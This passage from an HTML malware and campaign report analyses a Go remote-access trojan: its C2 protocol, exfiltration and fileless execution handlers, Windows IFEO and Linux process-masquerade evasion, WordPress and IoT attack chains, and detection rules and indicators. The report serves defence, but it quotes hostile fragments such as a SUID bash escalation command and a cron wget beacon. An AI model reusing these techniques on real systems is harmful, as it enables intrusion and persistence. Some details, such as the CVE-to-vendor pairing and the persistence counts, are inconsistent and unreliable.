-  <rect x="472" y="136" width="278" height="38" rx="5" fill="#111" stroke="#484f58" stroke-width="1.2"/>
-  <text x="611" y="153" text-anchor="middle" font-family="'Courier New',monospace" font-size="10" fill="#8b949e">AES-GCM · AES-CBC · AES-CTR</text>
-  <text x="611" y="167" text-anchor="middle" font-family="'Courier New',monospace" font-size="8" fill="#484f58">x/crypto/aes · base64 · obfs.buildKey(CRC32)</text>
-
-  <!-- ─── Band 4: Payload types ──────────────────────────────────────────── -->
-  <!-- 5 chips: check-in, upload, exec, proxy, heartbeat/selfdestruct -->
-  <rect x="88" y="198" width="120" height="30" rx="5" fill="#0a1a0a" stroke="#22c55e" stroke-width="1.1"/>
-  <text x="148" y="213" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#22c55e">NodeOnlineData beacon</text>
-  <text x="148" y="224" text-anchor="middle" font-family="'Courier New',monospace" font-size="7" fill="#484f58">15-field JSON check-in</text>
-
-  <rect x="218" y="198" width="104" height="30" rx="5" fill="#111" stroke="#f97316" stroke-width="1.1"/>
-  <text x="270" y="213" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#f97316">UploadData exfil</text>
-  <text x="270" y="224" text-anchor="middle" font-family="'Courier New',monospace" font-size="7" fill="#484f58">file read + base64</text>
-
-  <rect x="332" y="198" width="110" height="30" rx="5" fill="#111" stroke="#ff4444" stroke-width="1.1"/>
-  <text x="387" y="213" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#ff4444">exec / rawExec</text>
-  <text x="387" y="224" text-anchor="middle" font-family="'Courier New',monospace" font-size="7" fill="#484f58">result · ACK_FROM_SERVER</text>
-
-  <rect x="452" y="198" width="110" height="30" rx="5" fill="#100a1a" stroke="#a855f7" stroke-width="1.1"/>
-  <text x="507" y="213" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#a855f7">SOCKS5 proxy</text>
-  <text x="507" y="224" text-anchor="middle" font-family="'Courier New',monospace" font-size="7" fill="#484f58">handleProxyStart/Stop</text>
-
-  <rect x="572" y="198" width="178" height="30" rx="5" fill="#111" stroke="#484f58" stroke-width="1.1"/>
-  <text x="661" y="213" text-anchor="middle" font-family="'Courier New',monospace" font-size="9" fill="#8b949e">heartbeat · selfDestruct</text>
-  <text x="661" y="224" text-anchor="middle" font-family="'Courier New',monospace" font-size="7" fill="#484f58">persistence · memExec · handleFileList</text>
-</svg>
-</div>
-
-<pre><code><span class="muted"># Reconstructed from binary string analysis:</span>
-
-Transport:  TCP → TLS 1.3 (ECH enabled, MLKEM key exchange)
-Framing:    HTTP/2 (HPACK header compression)
-Encryption: ChaCha20Poly1305 AEAD (primary)
-            AES-GCM (fallback)
-Key Setup:  RSA asymmetric key exchange → HKDF derived session keys
-Auth:       base64.Encoding (payload transport layer)
-Recon:      json:"username,omitempty" json:"cpu_uname,omitempty"
-            → structured JSON check-in with hostname, arch, CPU info</code></pre>
-
-<h3>Protocol Wire Format — Reconstructed</h3>
-
-<div class="callout-blue">
-  <p><strong>Commands are uint16 opcodes</strong> dispatched through a <code>map[uint16]func(*protocol.ServerRequest)*protocol.ResultReport</code> table. Each frame is length-prefixed with a header area and encoded data body. A rotating 16-byte auth token is updated on every server ACK.</p>
-</div>
-
-<pre><code><span class="muted">// Server → Agent command envelope (JSON over custom frame)</span>
-{
-  <span class="st">"cmd"</span>:    <span class="fn">uint16</span>,        <span class="muted">// opcode — dispatch table key</span>
-  <span class="st">"data"</span>:   <span class="fn">&lt;typed payload&gt;</span>, <span class="muted">// handler-specific struct</span>
-  <span class="st">"taskid"</span>: <span class="fn">string</span>,
-  <span class="st">"uuid"</span>:   <span class="fn">string</span>
-}
-
-<span class="muted">// Server ACK format (rotates auth token):</span>
-ACK_FROM_SERVER: PL=<span class="fn">%d</span> RID=<span class="fn">%d</span>   <span class="muted">// Payload Length + Request ID</span>
-<span class="muted">// "token updated from server ACK" — 16-byte token rotated each ACK</span>
-
-<span class="muted">// Full beacon JSON (NodeOnlineData — all fields omitempty):</span>
-{
-  <span class="st">"computer_name"</span>:      <span class="kw">""</span>,
-  <span class="st">"cpu_cores"</span>:          <span class="fn">0</span>,
-  <span class="st">"cpu_info"</span>:           <span class="kw">""</span>,
-  <span class="st">"cpu_uname"</span>:          <span class="kw">""</span>,
-  <span class="st">"cpu_usage_percent"</span>:  <span class="fn">0.0</span>,
-  <span class="st">"device_type"</span>:        <span class="kw">""</span>,     <span class="muted">// DMI chassis type — VM detection</span>
-  <span class="st">"disk_space"</span>:         <span class="kw">""</span>,
-  <span class="st">"internet_ip"</span>:        <span class="kw">""</span>,     <span class="muted">// queried from 5 geo-IP services</span>
-  <span class="st">"intranet_ip"</span>:        <span class="kw">""</span>,
-  <span class="st">"language"</span>:           <span class="kw">""</span>,
-  <span class="st">"libp2p_peer_id"</span>:     <span class="kw">""</span>,     <span class="muted">// ~/.p2p/peer_id or \.p2p\peer_id</span>
-  <span class="st">"memory_total_mb"</span>:    <span class="fn">0</span>,
-  <span class="st">"memory_used_mb"</span>:     <span class="fn">0</span>,
-  <span class="st">"os_version"</span>:         <span class="kw">""</span>,
-  <span class="st">"timezone"</span>:           <span class="kw">""</span>,
-  <span class="st">"username"</span>:           <span class="kw">""</span>
-}
-
-<span class="muted">// External IP — 5 services queried in parallel (goroutines):</span>
-http://ipinfo.io/ip  ·  http://icanhazip.com  ·  http://api.ipify.org
-http://ifconfig.me/ip  ·  http://checkip.amazonaws.com</code></pre>
-
-<h3>Complete Handler Dispatch Table</h3>
-
-<div class="tbl-wrap">
-<table>
-  <thead><tr><th>Handler</th><th>Description</th><th>Protocol Struct</th><th>New?</th></tr></thead>
-  <tbody>
-    <tr><td class="mono red-text">handleExec</td><td>Async shell command execution</td><td class="mono">ExecReqData / ExecResult</td><td><span class="pill p-dim">known</span></td></tr>
-    <tr><td class="mono red-text">handleRawExec</td><td>Raw exec without shell wrapper, supports gzip payload</td><td class="mono">ExecReqData</td><td><span class="pill p-red">NEW</span></td></tr>
-    <tr><td class="mono red-text">handleMemExec</td><td>In-memory fileless exec via MemfdCreate / gzip</td><td class="mono">MemExecPayload</td><td><span class="pill p-dim">known</span></td></tr>
-    <tr><td class="mono red-text">handleUpload</td><td>File exfiltration: target → C2 (multipart HTTP POST)</td><td class="mono">UploadData / UploadReqData</td><td><span class="pill p-dim">known</span></td></tr>
-    <tr><td class="mono red-text">handleDownload</td><td>File delivery: C2 → target (supports gzip, replace)</td><td class="mono">DownloadData / DownloadReqData</td><td><span class="pill p-red">NEW</span></td></tr>
-    <tr><td class="mono red-text">handleFileList</td><td>Remote directory listing</td><td class="mono">FileListReqData</td><td><span class="pill p-red">NEW</span></td></tr>
-    <tr><td class="mono red-text">handleProxyStart</td><td>Start SOCKS5 proxy listener</td><td class="mono">ProxyConfig / ProxyStartReqData</td><td><span class="pill p-red">NEW</span></td></tr>
-    <tr><td class="mono red-text">handleProxyStop</td><td>Stop SOCKS5 proxy</td><td class="mono">—</td><td><span class="pill p-red">NEW</span></td></tr>
-    <tr><td class="mono red-text">handleSOCKS5</td><td>Individual SOCKS5 connection handler</td><td class="mono">—</td><td><span class="pill p-red">NEW</span></td></tr>
-    <tr><td class="mono red-text">handleHeartbeat</td><td>Keepalive / ping with SendPingTimeout</td><td class="mono">—</td><td><span class="pill p-red">NEW</span></td></tr>
-    <tr><td class="mono red-text">handlePersistence</td><td>Install systemd user service or SysV init (Linux) / Windows Service</td><td class="mono">—</td><td><span class="pill p-dim">known</span></td></tr>
-    <tr><td class="mono red-text">handleSelfDestruct</td><td>cleanupPersistenceArtifacts → selfDelete (ordered)</td><td class="mono">—</td><td><span class="pill p-dim">known</span></td></tr>
-  </tbody>
-</table>
-</div>
-
-<h3>Anti-Analysis — Advanced Techniques</h3>
-
-<div class="callout-red">
-  <p><strong>Windows IFEO Abuse:</strong> <code>disguiseIFEO</code> writes the agent's own path as the <code>Debugger</code> value under <code>SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\&lt;target_process&gt;</code>. When the targeted process launches, Windows invokes the "debugger" (the agent) instead — making the agent appear to be a legitimate system process from the perspective of process list, parent-child tree, and Windows Event Log. Combined with <code>cleanEnv</code> (environment sanitization for child processes) and <code>HideWindow</code> (no console), this is nearly invisible to standard host monitoring.</p>
-</div>
-
-<pre><code><span class="muted">// Linux: three-layer process masquerade</span>
-main.disguiseProcess()
-  ├── loader.DisguiseProcessNameLinux()
-  │     ├── <span class="fn">prctl(PR_SET_NAME, "fake_name")</span>   <span class="muted">// defeats /proc/self/status Name:</span>
-  │     └── <span class="fn">spoofArgv(argv[0], "fake_name")</span>  <span class="muted">// defeats ps aux + /proc/self/cmdline</span>
-  └── main.daemonize()                        <span class="muted">// fork → setsid → detach tty</span>
-
-<span class="muted">// Windows: IFEO hijack + ConPTY interactive shell</span>
-loader.disguiseIFEO()
-  └── <span class="org">SOFTWARE\...\Image File Execution Options\&lt;legit.exe&gt;</span>
-        └── Debugger = <span class="fn">C:\...\agent_windows_amd64.exe</span>
-
-<span class="muted">// Interactive shell (Windows — full terminal, not piped cmd.exe):</span>
-CreatePseudoConsole() + ResizePseudoConsole()  <span class="muted">// ConPTY — proper terminal sizing</span>
-Module32NextW / Thread32First / EnumProcesses  <span class="muted">// process enumeration for injection target</span>
-
-<span class="muted">// String obfuscation key derivation:</span>
-obfs.buildKey(<span class="fn">hash/crc32</span>)  <span class="muted">// CRC32-based key → S-box substitution (obfs.S)</span>
-                              <span class="muted">// C2 IP/domain hidden behind this — NOT plaintext</span></code></pre>
-
-<!-- 06 ATTACK CHAIN -->
-<h2 id="chain">06. Full Attack Chain</h2>
-
-<h3>Chain A — WordPress to RAT</h3>
-<div class="stage-list">
-  <div class="stage-item"><div class="stage-num">1</div><div><div class="stage-name">Reconnaissance — wp2shell check</div><div class="stage-desc">Probe <code>/wp-json/batch/v1</code> for route-confusion marker pattern: <code>parse_path_failed</code> + <code>block_cannot_read</code> + <code>rest_batch_not_allowed</code> — confirms vulnerability without SQLi payload.</div></div></div>
-  <div class="stage-item"><div class="stage-num">2</div><div><div class="stage-name">SQL Injection — UNION / blind extraction</div><div class="stage-desc">Extract DB version, table prefix, admin user ID, wp_posts table name. Auto-selects UNION → error-based → blind depending on target configuration.</div></div></div>
-  <div class="stage-item"><div class="stage-num">3</div><div><div class="stage-name">oEmbed poisoning + changeset chain</div><div class="stage-desc">Forge seven UNION <code>wp_posts</code> rows creating changeset → nav_menu_item → request graph. A single batch POST triggers WordPress to write real oEmbed cache entries.</div></div></div>
-  <div class="stage-item"><div class="stage-num">4</div><div><div class="stage-name">Pre-auth admin creation</div><div class="stage-desc"><code>POST /wp/v2/users</code> dispatched via route-confusion creates <code>wp2_&lt;nonce&gt;</code> administrator. No credentials. Account auto-deleted at session end.</div></div></div>
-  <div class="stage-item"><div class="stage-num">5</div><div><div class="stage-name">Plugin webshell → stager</div><div class="stage-desc">Webshell uploaded via plugin upload behavior. Executes <code>wp2shell_stager.sh</code> — arch detection, agent download from <code>:80</code>, 6-method persistence. Webshell deleted.</div></div></div>
-  <div class="stage-item"><div class="stage-num">6</div><div><div class="stage-name">Agent execution → C2 beacon</div><div class="stage-desc"><code>/tmp/.cache-mgr</code> runs in background, beacons to <code>v9g6.my:443</code> over TLS 1.3 with ChaCha20Poly1305. MemfdCreate used if fileless execution is possible.</div></div></div>
-</div>
-
-<h3>Chain B — IoT Mass Compromise</h3>
-<div class="stage-list">
-  <div class="stage-item"><div class="stage-num">1</div><div><div class="stage-name">Target list ingestion</div><div class="stage-desc"><code>confirmed.json</code> supplies pre-validated IP:port:arch tuples. <code>batch_deploy_full.py</code> operates 5 concurrent threads.</div></div></div>
-  <div class="stage-item"><div class="stage-num">2</div><div><div class="stage-name">CVE-2021-36260 exploitation</div><div class="stage-desc">Unauthenticated GET to UniFi SSO endpoint with path traversal + base64-encoded shell payload in <code>pkg_name</code>. Timing oracle confirms execution.</div></div></div>
-  <div class="stage-item"><div class="stage-num">3</div><div><div class="stage-name">SUID bash escalation</div><div class="stage-desc"><code>sudo -n chmod 4755 /bin/bash</code> → <code>bash -p -c</code> for root execution. Permissions restored afterward.</div></div></div>
-  <div class="stage-item"><div class="stage-num">4</div><div><div class="stage-name">Agent download + execution</div><div class="stage-desc">Curl downloads arch-specific binary to <code>/usr/local/bin/.uniFi-core</code>. Launched via nohup. PID confirmed via timing oracle.</div></div></div>
-  <div class="stage-item"><div class="stage-num">5</div><div><div class="stage-name">Four-method persistence</div><div class="stage-desc">systemd (<code>uniFi-core.service</code>), crontab <code>@reboot</code>, init.d script, rc-update. All deployed simultaneously.</div></div></div>
-  <div class="stage-item"><div class="stage-num">6</div><div><div class="stage-name">Heartbeat + RAT C2</div><div class="stage-desc">10-min cron beacons to staging server beacon endpoint. Agent independently connects to <code>v9g6.my:443</code> RAT C2.</div></div></div>
-</div>
-
-<!-- 07 TAIWAN -->
-<h2 id="geo">07. Geographic Targeting — Observable Facts</h2>
-
-<p>Deployment logs recovered from the open directory confirm at least 167 compromised IoT devices. Victim devices span three countries: <strong>Taiwan</strong> (dedicated target list against Chunghwa Telecom's network), <strong>Japan</strong> (devices confirmed in deployment runs), and <strong>United States</strong> (IoT devices observed in botnet deployment logs). No geographic victim records exist for the WordPress exploitation component.</p>
-
-<h3>Taiwan — Dedicated Targeting Operation</h3>
-
-<p>A dedicated file <code>targets_TW_chunghwa.txt</code> recovered from the open directory contains IP addresses on Chunghwa Telecom's network (AS3462), Taiwan's primary ISP. A separate reconnaissance directory <code>tw_recon_results/</code> contains device fingerprinting output specific to those targets — indicating active pre-exploitation scanning rather than passive collection. No attribution to any specific threat actor or government is made from these observations.</p>
-
-<div class="callout-orange">
-  <p><strong>Observable indicators (stated as facts, not attribution):</strong> (1) Dedicated target list for AS3462 Chunghwa Telecom. (2) Active HNAP model fingerprinting with results saved to <code>tw_recon_results/hnap_models.txt</code>. (3) D-Link DIR-868L confirmed on unpatched 2017 firmware in those results. (4) Operator scripts written in Mandarin Chinese. (5) A LoongArch64 binary is included in the payload set alongside the standard architectures. These are direct observations from recovered files — any further inference is left to the reader.</p>
-</div>
-
-<div class="tbl-wrap">
-<table>
-  <thead><tr><th>Region</th><th>Vector</th><th>Targets</th><th>Character</th></tr></thead>
-  <tbody>
-    <tr><td class="strong">United States</td><td class="mono">IoT CVEs — Ubiquiti, D-Link, Totolink</td><td class="mono">IoT devices confirmed in deployment logs</td><td>Opportunistic — botnet node deployment</td></tr>
-    <tr><td class="strong">Japan</td><td class="mono">IoT CVEs — Totolink, D-Link</td><td class="mono">Confirmed from deployment logs</td><td>Targeted — devices observed in deployment runs</td></tr>
-    <tr><td class="strong">Taiwan (AS3462)</td><td class="mono">IoT CVEs — D-Link, UniFi, Totolink</td><td class="mono red-text">Chunghwa Telecom hosts</td><td>Deliberate — dedicated target list + recon</td></tr>
-  </tbody>
-</table>
-</div>
-
-<h3>Taiwan Infrastructure Detail</h3>
-<div class="tbl-wrap">
-<table>
-  <thead><tr><th>Detail</th><th>Value</th><th>Assessment</th></tr></thead>
-  <tbody>
-    <tr><td>ASN / ISP</td><td class="strong">Chunghwa Telecom, Taiwan</td><td>Primary national ISP — critical infrastructure</td></tr>
-    <tr><td>Target count</td><td class="mono red-text">[redacted]</td><td>Dedicated list, not subset of global scan</td></tr>
-
-    <tr><td>Confirmed device</td><td class="mono">D-Link DIR-868L FW=1.13/1.20 (2017)</td><td>Unpatched ~9-year-old firmware</td></tr>
-    <tr><td>Recon artifacts</td><td class="mono">tw_recon_results/hnap_models.txt</td><td>Active fingerprinting conducted</td></tr>
-    <tr><td>Operator language</td><td>Mandarin Chinese (simplified)</td><td>Observed in deploy script comments</td></tr>
-    <tr><td>LoongArch binary</td><td class="mono">agent_linux_loong64</td><td>LoongArch64 architecture variant present in payload set</td></tr>
-  </tbody>
-</table>
-</div>
-
-<!-- 08 MITRE -->
-<h2 id="mitre">08. MITRE ATT&amp;CK Mapping</h2>
-
-<div class="mitre-grid">
-  <div class="mitre-cell"><div class="mitre-id">T1190</div><div class="mitre-name">Exploit Public-Facing Application</div><div class="mitre-conf">CVE-2026-63030 (WP SQLi), CVE-2026-60137 (WP authz bypass), CVE-2021-36260 (UniFi RCE), CVE-2026-34908 (D-Link), CVE-2026-1547 (Totolink) · <span style="color:var(--green)">CONFIRMED</span></div></div>
-  <div class="mitre-cell"><div class="mitre-id">T1505.003</div><div class="mitre-name">Web Shell</div><div class="mitre-conf">WordPress plugin upload webshell, random path, auto-delete · <span style="color:var(--green)">CONFIRMED</span></div></div>
-  <div class="mitre-cell"><div class="mitre-id">T1059.004</div><div class="mitre-name">Unix Shell</div><div class="mitre-conf">All stager/dropper/persist scripts · <span style="color:var(--green)">CONFIRMED</span></div></div>
-  <div class="mitre-cell"><div class="mitre-id">T1105</div><div class="mitre-name">Ingress Tool Transfer</div><div class="mitre-conf">curl/wget/python3 download from staging server · <span style="color:var(--green)">CONFIRMED</span></div></div>
-  <div class="mitre-cell"><div class="mitre-id">T1053.003</div><div class="mitre-name">Cron</div><div class="mitre-conf">@reboot + */10/*/30 entries across all stagers · <span style="color:var(--green)">CONFIRMED</span></div></div>
-  <div class="mitre-cell"><div class="mitre-id">T1543.002</div><div class="mitre-name">Systemd Service</div><div class="mitre-conf">cache-mgr.service, uniFi-core.service, S99dbusd · <span style="color:var(--green)">CONFIRMED</span></div></div>
-  <div class="mitre-cell"><div class="mitre-id">T1546.004</div><div class="mitre-name">Unix Shell Config</div><div class="mitre-conf">/etc/profile, .bashrc, .profile injection · <span style="color:var(--green)">CONFIRMED</span></div></div>
-  <div class="mitre-cell"><div class="mitre-id">T1036.005</div><div class="mitre-name">Masquerade — Legit Name</div><div class="mitre-conf">.cache-mgr, .uniFi-core, syslog-ng, dbusd · <span style="color:var(--green)">CONFIRMED</span></div></div>
-  <div class="mitre-cell"><div class="mitre-id">T1027.002</div><div class="mitre-name">Software Packing</div><div class="mitre-conf">UPX 4.22 on all agent binaries · <span style="color:var(--green)">CONFIRMED</span></div></div>
-  <div class="mitre-cell"><div class="mitre-id">T1620</div><div class="mitre-name">Reflective Code Loading</div><div class="mitre-conf">unix.MemfdCreate fileless execution (Linux) · <span style="color:var(--yellow)">HIGH</span></div></div>
-  <div class="mitre-cell"><div class="mitre-id">T1055.001</div><div class="mitre-name">DLL Injection</div><div class="mitre-conf">LoadLibraryEx + GetProcAddress (Windows binary) · <span style="color:var(--yellow)">HIGH</span></div></div>
-  <div class="mitre-cell"><div class="mitre-id">T1071.001</div><div class="mitre-name">Web Protocols C2</div><div class="mitre-conf">HTTP/2 + TLS 1.3, beacon to :8443/beacon · <span style="color:var(--green)">CONFIRMED</span></div></div>
-  <div class="mitre-cell"><div class="mitre-id">T1573.002</div><div class="mitre-name">Encrypted Channel — Asymmetric</div><div class="mitre-conf">ChaCha20Poly1305 AEAD + RSA key exchange · <span style="color:var(--green)">CONFIRMED</span></div></div>
-  <div class="mitre-cell"><div class="mitre-id">T1082</div><div class="mitre-name">System Information Discovery</div><div class="mitre-conf">collectCPUArch/Info/Usage, uname, hostname · <span style="color:var(--green)">CONFIRMED</span></div></div>
-  <div class="mitre-cell"><div class="mitre-id">T1012</div><div class="mitre-name">Query Registry</div><div class="mitre-conf">RegOpenKeyEx, RegQueryValueEx (Windows) · <span style="color:var(--yellow)">HIGH</span></div></div>
-  <div class="mitre-cell"><div class="mitre-id">T1070.004</div><div class="mitre-name">File Deletion</div><div class="mitre-conf">selfDeleteLinux/Windows, webshell auto-delete · <span style="color:var(--green)">CONFIRMED</span></div></div>
-  <div class="mitre-cell"><div class="mitre-id">T1562.001</div><div class="mitre-name">Disable/Modify Tools</div><div class="mitre-conf">SUID bash escalation (chmod 4755), restored after use · <span style="color:var(--green)">CONFIRMED</span></div></div>
-  <div class="mitre-cell"><div class="mitre-id">T1078.003</div><div class="mitre-name">Local Accounts</div><div class="mitre-conf">wp2_&lt;nonce&gt; admin created pre-auth, auto-removed · <span style="color:var(--green)">CONFIRMED</span></div></div>
-</div>
-
-<!-- 09 DETECTION -->
-<h2 id="detection">09. Detection</h2>
-
-<h3>YARA</h3>
-<pre><code><span class="kw">rule</span> <span class="fn">AgentTCP_Packed</span> {
-    <span class="fn">meta</span>:
-        description  = <span class="st">"Agent-TCP RAT — UPX packed binary (wp2shell campaign)"</span>
-        hash_linux   = <span class="st">"9c285fe3a491ee6a6f872ae71d47dfe29e44a40b9e7fcba85a39a2368584333a"</span>
-        hash_windows = <span class="st">"4ff527e0d8fc36a99a491bc69a9cabeb055a4be470e22ec3da8e8bb741be9efc"</span>
-    <span class="fn">strings</span>:
-        $upx   = { 55 50 58 21 0D 0A 1A 0A }
-        $build = <span class="st">"go-agent-tcp"</span> ascii
-    <span class="fn">condition</span>:
-        (uint32(0) == 0x464C457F <span class="kw">or</span> uint16(0) == 0x5A4D) <span class="kw">and</span> $upx <span class="kw">and</span> $build
-}
-
-<span class="kw">rule</span> <span class="fn">AgentTCP_Unpacked</span> {
-    <span class="fn">meta</span>:
-        description = <span class="st">"Agent-TCP RAT — unpacked binary or memory scan"</span>
-    <span class="fn">strings</span>:
-        $path   = <span class="st">"D:/BIN_Research/Knowledge/Defense-Evasion/go-agent-tcp"</span> ascii
-        $mlkem  = <span class="st">"mlkemCiphertextSize"</span> ascii
-        $memexec = <span class="st">"handleMemExec"</span> ascii
-    <span class="fn">condition</span>:
-        $path <span class="kw">or</span> ($mlkem <span class="kw">and</span> $memexec)
-}
-
-<span class="kw">rule</span> <span class="fn">wp2shell_Stager</span> {
-    <span class="fn">meta</span>:
-        description = <span class="st">"wp2shell post-compromise stager script"</span>
-        hash        = <span class="st">"8d7885a574459908cd70d3718119a31a4a6c95052e3d1548feeccfffa00d4cde"</span>
-    <span class="fn">strings</span>:
-        $tag    = <span class="st">"[wp2]"</span> ascii
-        $beacon = <span class="st">"/beacon?host="</span> ascii
-    <span class="fn">condition</span>:
-        $tag <span class="kw">and</span> $beacon
-}</code></pre>
-
-<h3>Sigma</h3>
-<pre><code>title: WordPress batch/v1 Route-Confusion SQLi (CVE-2026-63030 / wp2shell)
-id: 7f3a8c20-e14b-4d92-b561-9c0d3f5e7a81
-status: stable
-tags: [attack.initial_access, attack.t1190]
-logsource: {category: webserver}
-detection:
-  selection:
-    cs-uri-stem|contains: '/wp-json/batch/v1'
-    cs-uri-query|contains: 'author_exclude'
-  condition: selection
-level: critical
-
----
-title: Agent-TCP Process Masquerade (wp2shell campaign)
-id: 3d8b5f92-a741-4c1e-8b03-6e2d9f0c4a57
-status: stable
-tags: [attack.defense_evasion, attack.t1036.005]
-logsource: {category: process_creation, product: linux}
-detection:
-  selection:
-    Image|endswith:
-      - '/usr/local/bin/.cache-mgr'
-      - '/usr/local/bin/.uniFi-core'
-      - '/usr/local/bin/dbusd'
-      - '/usr/local/bin/syslog-ng'
-  condition: selection
-level: high
-
----
-title: Agent-TCP IFEO Debugger Hijack (Windows)
-id: 5a1c7e83-2b94-4f60-9d12-8c3e0b5f7a24
-status: stable
-tags: [attack.defense_evasion, attack.t1546.012]
-logsource: {category: registry_set, product: windows}
-detection:
-  selection:
-    TargetObject|contains: '\Image File Execution Options\'
-    TargetObject|endswith: '\Debugger'
-    Details|contains: 'agent_windows_amd64'
-  condition: selection
-level: high</code></pre>
-
-<!-- 10 IOC -->
-<h2 id="ioc">10. Indicators of Compromise</h2>
-
-<h3>Network</h3>
-<div class="tbl-wrap">
-<table>
-  <thead><tr><th>Type</th><th>Indicator</th><th>Role</th><th>Status</th></tr></thead>
-  <tbody>
-    <tr><td><span class="pill p-red">DOMAIN</span></td><td class="mono red-text">v9g6.my</td><td>RAT C2 — primary agent communication</td><td><span style="color:var(--red)">ACTIVE</span></td></tr>
-    <tr><td><span class="pill p-red">IP</span></td><td class="mono red-text">202.61.136.40</td><td>RAT C2 resolved IP (v9g6.my)</td><td><span style="color:var(--red)">ACTIVE</span></td></tr>
-    <tr><td><span class="pill p-orange">IP</span></td><td class="mono" style="color:var(--orange)">43.161.245.209</td><td>Secondary C2 infrastructure — multiple associated domains, campaign correlation under investigation</td><td><span style="color:var(--orange)">INVESTIGATING</span></td></tr>
-  </tbody>
-</table>
-</div>
-
-<h3>File Hashes — Agent-TCP (UPX packed)</h3>
-<div class="tbl-wrap">
-<table>
-  <thead><tr><th>Filename</th><th>Architecture</th><th>SHA-256</th><th>Size</th></tr></thead>
-  <tbody>
-    <tr><td class="mono">agent_linux_amd64</td><td>Linux x86-64</td><td class="mono red-text" style="font-size:9px;word-break:break-all;">9c285fe3a491ee6a6f872ae71d47dfe29e44a40b9e7fcba85a39a2368584333a</td><td class="mono">2.6 MB</td></tr>
-    <tr><td class="mono">agent_linux_arm64</td><td>Linux ARM64</td><td class="mono red-text" style="font-size:9px;word-break:break-all;">8d8280f0f12c656a5c87ac7d2f72417fdf36a4300276efeb4556060f1c98b461</td><td class="mono">2.3 MB</td></tr>
-    <tr><td class="mono">agent_linux_arm7</td><td>Linux ARMv7</td><td class="mono red-text" style="font-size:9px;word-break:break-all;">f51a9f65354d24fe29b06e8b89bb00ffd188e5093f92145895d564b331ce4a1b</td><td class="mono">2.4 MB</td></tr>
-    <tr><td class="mono">agent_linux_arm5</td><td>Linux ARMv5</td><td class="mono red-text" style="font-size:9px;word-break:break-all;">537aca3cf179c142a53346e7ad4da80757d42637489ee0bf1bc3ddfc097073e5</td><td class="mono">2.4 MB</td></tr>
-    <tr><td class="mono">agent_linux_mips</td><td>Linux MIPS BE</td><td class="mono red-text" style="font-size:9px;word-break:break-all;">1dbc908b691e28c0671237f45b9573af2420b0c02959bc6b2dc9bca20a70cce5</td><td class="mono">2.5 MB</td></tr>
-    <tr><td class="mono">agent_linux_mipsle</td><td>Linux MIPS LE</td><td class="mono red-text" style="font-size:9px;word-break:break-all;">640b82f6941327dd907ba66c6a4e79f864ebebc57fc3c8edd448ce07e64d6d55</td><td class="mono">2.5 MB</td></tr>
-    <tr><td class="mono">agent_linux_mips64</td><td>Linux MIPS64 BE</td><td class="mono red-text" style="font-size:9px;word-break:break-all;">c1b9c1202b38acb5dcda58d49249f2987cfc31cdb2a48aa501bca77dd59a7a41</td><td class="mono">6.9 MB</td></tr>
-    <tr><td class="mono">agent_linux_mips64le</td><td>Linux MIPS64 LE</td><td class="mono red-text" style="font-size:9px;word-break:break-all;">b1b1b7b514c38922e8e276e082349b07c304bd3218f397cb2dbf753d86b60442</td><td class="mono">6.8 MB</td></tr>
-    <tr><td class="mono">agent_linux_ppc64</td><td>Linux PPC64 BE</td><td class="mono red-text" style="font-size:9px;word-break:break-all;">2620182571d87f9b26ceae2427d7dbe061bdb7d1e6bdf8f1445e8fc4e2852041</td><td class="mono">2.3 MB</td></tr>
-    <tr><td class="mono">agent_linux_ppc64le</td><td>Linux PPC64 LE</td><td class="mono red-text" style="font-size:9px;word-break:break-all;">bcf0c261299f471ab61e7ac296fb8876088fcfca71529bad5d5b2fdc057bd92c</td><td class="mono">2.4 MB</td></tr>
-    <tr><td class="mono">agent_windows_amd64.exe</td><td>Windows x86-64</td><td class="mono red-text" style="font-size:9px;word-break:break-all;">4ff527e0d8fc36a99a491bc69a9cabeb055a4be470e22ec3da8e8bb741be9efc</td><td class="mono">2.7 MB</td></tr>
-  </tbody>
-</table>
-</div>
-
-<h3>File Hashes — Deployment Scripts</h3>
-<div class="tbl-wrap">
-<table>
-  <thead><tr><th>Filename</th><th>Description</th><th>SHA-256</th><th>Size</th></tr></thead>
-  <tbody>
-    <tr><td class="mono">wp2shell Stager</td><td>Post-exploit stager — arch detection, agent download, 4-method persistence</td><td class="mono red-text" style="font-size:9px;word-break:break-all;">8d7885a574459908cd70d3718119a31a4a6c95052e3d1548feeccfffa00d4cde</td><td class="mono">6.2 KB</td></tr>
-  </tbody>
-</table>
-</div>
-
-<h3>Filesystem &amp; Persistence Artifacts</h3>
-<div class="tbl-wrap">
-<table>
-  <thead><tr><th>Type</th><th>Artifact</th><th>Platform</th><th>Notes</th></tr></thead>
-  <tbody>
-    <tr><td><span class="pill p-red">PATH</span></td><td class="mono">/usr/local/bin/.uniFi-core</td><td>Linux</td><td>Agent binary — dot-prefix hidden, mimics Ubiquiti service</td></tr>
-    <tr><td><span class="pill p-red">PATH</span></td><td class="mono">/usr/local/bin/.cache-mgr</td><td>Linux</td><td>Agent binary — dot-prefix hidden, generic cache name</td></tr>
-    <tr><td><span class="pill p-red">PATH</span></td><td class="mono">/usr/local/bin/dbusd</td><td>Linux</td><td>Agent binary — mimics D-Bus daemon</td></tr>
-    <tr><td><span class="pill p-red">PATH</span></td><td class="mono">/tmp/.cache-mgr</td><td>Linux</td><td>Initial drop path before persistence install</td></tr>
-    <tr><td><span class="pill p-orange">SERVICE</span></td><td class="mono">uniFi-core.service</td><td>Linux (systemd)</td><td>Persistence — mimics Ubiquiti UniFi service name</td></tr>
-    <tr><td><span class="pill p-orange">SERVICE</span></td><td class="mono">cache-mgr.service</td><td>Linux (systemd)</td><td>Persistence — alternative systemd unit name</td></tr>
-    <tr><td><span class="pill p-orange">SERVICE</span></td><td class="mono">S99dbusd</td><td>Linux (init.d)</td><td>Persistence — SysV init script, high run order</td></tr>
-    <tr><td><span class="pill p-orange">CRON</span></td><td class="mono">@reboot /usr/local/bin/.uniFi-core</td><td>Linux</td><td>Crontab persistence — reboot trigger</td></tr>
-    <tr><td><span class="pill p-orange">CRON</span></td><td class="mono">*/10 * * * * wget … /beacon</td><td>Linux</td><td>Heartbeat beacon — every 10 minutes</td></tr>
-    <tr><td><span class="pill p-orange">PATH</span></td><td class="mono">/etc/profile</td><td>Linux</td><td>Shell config injection — agent launch on login</td></tr>
